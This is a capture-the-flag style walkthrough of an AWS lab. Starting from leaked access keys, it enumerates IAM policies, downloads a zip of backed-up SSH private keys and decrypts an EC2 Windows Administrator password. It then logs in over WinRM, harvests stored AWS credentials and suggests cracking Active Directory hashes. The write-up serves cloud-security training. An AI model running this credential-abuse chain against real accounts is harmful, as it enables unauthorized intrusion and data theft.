https://app.pwnedlabs.io/labs/leverage-insecure-storage-and-backups-for-profit

### Scenario

Your team stumbled upon AWS credentials on a compromised IT workstation. Your mission now is to use these credentials to probe Huge Logistics' cloud infrastructure. Dive in, seek out sensitive data, and identify accessible critical resources to determine the potential extent of exposure.

### Information provided

```
Access key ID: AKIAWHEOTHRFRH64EQRI

Secret access key: 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
```

### Enumeration

First things first, we will check the basic information of the given credentials.

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDAWHEOTHRFTEMEHGPPY",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/contractor"
}
```

It seems that we are a `user` named `contractor`

Next lets check what kind of permissions this `user` has.

```
aws iam list-attached-user-policies --user-name contractor
```

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "Policy",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Policy"
        }
    ]
}
```

```
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Policy
```

```
{
    "Policy": {
        "PolicyName": "Policy",
        "PolicyId": "ANPAWHEOTHRFXRFIVBEXM",
        "Arn": "arn:aws:iam::427648302155:policy/Policy",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-07-27T17:39:55+00:00",
        "UpdateDate": "2023-07-28T14:24:22+00:00",
        "Tags": []
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4
```

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeInstances",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:GetPasswordData",
                    "Resource": "arn:aws:ec2:us-east-1:427648302155:instance/i-04cc1c2c7ec1af1b5"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "s3:GetBucketPolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:user/contractor",
                        "arn:aws:iam::427648302155:policy/Policy",
                        "arn:aws:s3:::hl-it-admin"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-28T14:24:22+00:00"
    }
}
```

With the above sequence of commands, we first found out the name of the policy attached to the `contractor`, next we checked the active version of the policy attached which helped us in enumerating the actual contents of the IAM user policy!

There are some interesting permission provided via this policy:-
- `ec2:DescribeInstances` is provided on all resources
- `ec2:GetPasswordData` is allowed on a particular `ec2` instance whose instance id is provided
- `s3:GetBucketPolicy` is allowed on `s3:::hl-it-admin` which is a S3 bucket
- then the permissions to list the policy for `contractor` user and related permissions are also mentioned

We will use all these commands one by one to figure out what more information we can get.

```
aws ec2 describe-instances
```

```
{
    "Reservations": []
}
```

Something seems off in the above output, lets try the region `us-east-1` since it is mentioned in the resources of one of the policy statements.

```
aws ec2 describe-instances --instance-ids i-04cc1c2c7ec1af1b5 --region us-east-1
```

```
{
    "Reservations": [
        {
            "ReservationId": "r-005e5ae930185ce9f",
            "OwnerId": "427648302155",
            "Groups": [],
            "Instances": [
                {
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2023-07-27T18:13:48+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-07411201581e71552",
                                "EbsCardIndex": 0
                            }
                        }
                    ],
                    "ClientToken": "04674e37-22e8-44b8-afff-94f5e36a4356",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "427648302155",
                                "PublicDnsName": "ec2-54-226-75-125.compute-1.amazonaws.com",
                                "PublicIp": "54.226.75.125"
                            },
                            "Attachment": {
                                "AttachTime": "2023-07-27T18:13:47+00:00",
                                "AttachmentId": "eni-attach-039c3eace03c5924e",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-0ae31edc4377d337b",
                                    "GroupName": "launch-wizard-19"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "12:7b:11:42:a4:0d",
                            "NetworkInterfaceId": "eni-070802f93fd899fe9",
                            "OwnerId": "427648302155",
                            "PrivateDnsName": "ip-172-31-93-149.ec2.internal",
                            "PrivateIpAddress": "172.31.93.149",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "427648302155",
                                        "PublicDnsName": "ec2-54-226-75-125.compute-1.amazonaws.com",
                                        "PublicIp": "54.226.75.125"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-172-31-93-149.ec2.internal",
                                    "PrivateIpAddress": "172.31.93.149"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-02700fc3bdb2a97ac",
                            "VpcId": "vpc-088b21ff238e2caed",
                            "InterfaceType": "interface",
                            "Operator": {
                                "Managed": false
                            }
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupId": "sg-0ae31edc4377d337b",
                            "GroupName": "launch-wizard-19"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "Backup"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 1
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Windows",
                    "UsageOperation": "RunInstances:0002",
                    "UsageOperationUpdateTime": "2023-07-27T18:13:47+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": true,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default",
                        "RebootMigration": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios",
                    "NetworkPerformanceOptions": {
                        "BandwidthWeighting": "default"
                    },
                    "Operator": {
                        "Managed": false,
                        "HiddenByDefault": false
                    },
                    "SecondaryInterfaces": [],
                    "InstanceId": "i-04cc1c2c7ec1af1b5",
                    "ImageId": "ami-0ae60b1f2a289b01e",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "PrivateDnsName": "ip-172-31-93-149.ec2.internal",
                    "PublicDnsName": "ec2-54-226-75-125.compute-1.amazonaws.com",
                    "StateTransitionReason": "",
                    "KeyName": "it-admin",
                    "AmiLaunchIndex": 0,
                    "ProductCodes": [],
                    "InstanceType": "t2.micro",
                    "LaunchTime": "2025-03-24T19:47:34+00:00",
                    "Placement": {
                        "AvailabilityZoneId": "use1-az2",
                        "GroupName": "",
                        "Tenancy": "default",
                        "AvailabilityZone": "us-east-1b"
                    },
                    "Platform": "windows",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "SubnetId": "subnet-02700fc3bdb2a97ac",
                    "VpcId": "vpc-088b21ff238e2caed",
                    "PrivateIpAddress": "172.31.93.149",
                    "PublicIpAddress": "54.226.75.125"
                }
            ]
        }
    ]
}
```

Some useful information worth noting in the above output is the `public IP` of the `eni` attached to the `ec2` instance. This public IP can potentially be used to access the instance. Also, this instance is a `Windows` machine.

Lets try enumerating the services present on the public IP using `nmap`

```
nmap 54.226.75.125 -Pn -sV -sC -p5985
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-13 07:21 IST
Nmap scan report for ec2-54-226-75-125.compute-1.amazonaws.com (54.226.75.125)
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

I have not included all the commands, however we see that port `TCP-5985` is open. A quick google search tells us that this specific port is used for `WinRM` or `Windows Remote Management`. It is similar to `SSH` for `linux`.

`TCP-5985` is used for `WinRM over HTTP` while `TCP-5986` is used for `WinRM over HTTPS`

Lets try the next command.

```
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --region us-east-1
```

```
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "Timestamp": "2024-12-01T07:51:43+00:00",
    "PasswordData": "s2QgAyMRT/OAjxv2F5FKSaco4lISg4kS+LTajSjr9eTHaKE0AdX0u7AaLzicaHV9Ki2Ue4OduBIxRPuwmzWHyUR/ZNgaI<REDACTED>"
}
```

The `ec2 get-password-data` command returns the password for the default `Administrator` user for windows `ec2` instances. The password however is returned in an encrypted format and can be decrypted using a `key` or `.pem`

Let us now enumerate the `S3` bucket `hl-it-admin`

```
aws s3api get-bucket-policy --bucket hl-it-admin | jq '.Policy |= fromjson'
```

```
{
  "Policy": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::427648302155:user/contractor"
        },
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::hl-it-admin/ssh_keys/ssh_keys_backup.zip"
      }
    ]
  }
}
```

We do have the permission to download `ssh_keys_backup.zip` file. 

```
aws s3api get-object --bucket hl-it-admin --key ssh_keys/ssh_keys_backup.zip ./exfil_ssh_keys.zip
```

```
{
    "AcceptRanges": "bytes",
    "LastModified": "2023-07-28T13:48:18+00:00",
    "ContentLength": 17483,
    "ETag": "\"648c3427be0943102c623aaf463e3be5\"",
    "ContentType": "application/zip",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
```

The file was downloaded in the mentioned path. Lets unzip it and inspect.

```
unzip exfil_ssh_keys.zip 
```

```
Archive:  exfil_ssh_keys.zip
  inflating: audit.pem               
  inflating: contractor.pem          
  inflating: contractor.ppk          
  inflating: iam-audit.pem           
  inflating: it-admin.pem            
  inflating: jenkins.pem             
  inflating: octopus-deploy.pem      
  inflating: sunita-adm.pem          
  inflating: viewer-dev.pem          
  inflating: viewer-dev.ppk  
```

Unzipping the compressed file gives us a bunch of private and public key pairs.

If we watched the output of `ec2 describe-instances` carefully, it mentions a `"KeyName": "it-admin"`
This key can be used to decrypt the password which we got.

```
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --region us-east-1 --priv-launch-key ./it-admin.pem
```

```
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "Timestamp": "2024-12-01T07:51:43+00:00",
    "PasswordData": "UZ$ab<REDACTED>"
}
```

### Initial access

Since we have the password now, lets try to access the ec2 instance. As I mentioned earlier, since the `WinRM` port is open over `HTTP`, we can use the password we just extracted to try logging in. We will use `powershell` for this!

![](Pasted%20image%2020260814001528.png)

In the above snapshot, we are doing two things:-
- Since we are using `HTTP` for `WinRM` instead of `HTTPS`, we are getting denied by default. First command is used to bypass this check.
- Also, we need to add the public IP of the remote host in our `TrustedHosts` list otherwise the communication will not happen.

**Note:-**
Make sure you are connected via the `WireGuard VPN` before attempting the lab.

![](Pasted%20image%2020260814001634.png)

```
$pass = ConvertTo-SecureString 'UZ$abR<REDACTED>' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential("Administrator", $pass)

Enter-PSSession -ComputerName 54.226.75.125 -Credential $cred
```

I used `powershell` from my host machine directly. I was not able to achieve the same result from `pwsh` in `ubuntu` which is my VM I use.

The above commands are used to get a remote session of the `ec2` instance running windows.

![](Pasted%20image%2020260814002503.png)

Once we login successfully, `Get-Command` lists the available list of commands for use in the remote session. We will use those commands to check for interesting information.

We can see there is a non-default `admin` user, we check his directory and find a `.aws` directory which has stored credentials!

![](Pasted%20image%2020260814002517.png)

### Privilege escalation

We will use the above credentials to login to the `aws cli`

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDAWHEOTHRFWB4TQKI2X",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/it-admin"
}
```

We are finally `it-admin` which is a privileged user.

No interesting information was available through manual testing. 

Lets try accessing the previous `S3` bucket which had a name of `hl-it-admin`

```
aws s3 ls hl-it-admin
```

```
                           PRE backup-2807/
                           PRE docs/
                           PRE installer/
                           PRE ssh_keys/
2023-07-27 21:21:45         99 contractor_accessKeys.csv
2023-07-28 17:17:07         32 flag.txt
```

Here we can see the `flag.txt` file!

```
aws s3 cp s3://hl-it-admin/flag.txt -
```

```
3129<REDACTED>
```

### Further reading

```
aws s3 ls s3://hl-it-admin/backup-2807/ --recursive
```

```
2023-07-28 18:05:38          0 backup-2807/
2023-07-28 21:22:58   33554432 backup-2807/ad_backup/Active Directory/ntds.dit
2023-07-28 21:23:07      16384 backup-2807/ad_backup/Active Directory/ntds.jfm
2023-07-28 21:23:06      65536 backup-2807/ad_backup/registry/SECURITY
2023-07-28 21:22:58   17825792 backup-2807/ad_backup/registry/SYSTEM
```

This directory contains very sensitive information about the users present in the active directory domain. We can use the `SYSTEM` hive and `ntds.dit` files to extract the password hashes for users. These hashes can then be cracked by using `hashcat` and a wordlist like `rockyou.txt`

The entire process is explained in detail in the official writeup!
